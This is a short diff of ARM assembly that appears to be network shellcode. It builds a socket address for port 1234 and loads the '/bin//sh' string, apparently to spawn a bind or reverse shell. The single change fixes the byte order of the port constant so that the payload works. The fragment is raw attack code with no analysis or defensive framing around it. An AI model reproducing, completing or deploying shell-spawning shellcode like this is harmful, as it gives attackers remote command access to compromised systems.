@@ -13,7 +13,7 @@
 
 _start:
     .code 32
-    ldr    r4, =#0xD402FF02 // htons(1234), AF_INET
+    ldr    r4, =#0xD204FF02 // htons(1234), AF_INET
     ldr    r5, =#0x6e69622f // /bin
     ldr    r6, =#0x68732f2f // //sh
     
